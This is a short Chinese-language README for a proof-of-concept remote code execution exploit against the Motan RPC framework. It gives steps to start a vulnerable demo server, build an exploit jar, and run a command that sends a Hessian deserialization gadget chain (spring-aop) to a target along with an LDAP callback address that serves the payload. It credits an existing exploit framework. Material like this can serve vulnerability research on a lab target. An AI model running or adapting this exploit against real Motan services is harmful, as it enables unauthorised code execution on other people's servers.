
# Motan-rce

## 快速利用

1. **motan-demo/motan-demo-server/src/main/java/com/weibo/motan/demo/server/DemoRpcServer.java** 启动Motan服务（漏洞靶场）

2. **编译rpc-rce：mvn clean package （jdk8+mvn3.2.5）**
```
java -jar dubbo-exp-1.0-SNAPSHOT-jar-with-dependencies.jar --target 127.0.0.1:8002 --protocol motan --serialization hessian  --gadget spring-aop --arg ldap://127.0.0.1:9988
```
[](https://github.com/zhzhdoai/Motan-rce/blob/master/poc.png)

## 漏洞复现

1. **motan-demo/motan-demo-server/src/main/java/com/weibo/motan/demo/server/DemoRpcServer.java** 启动Motan服务


2. **motan-demo/motan-demo-client/src/main/java/com/weibo/motan/demo/client/AnnotationRpcClientDemo.java** 运行攻击服务


# 鸣谢
rpc-rce框架拉取threedr3am/learnjavabug:https://github.com/threedr3am/learnjavabug.git

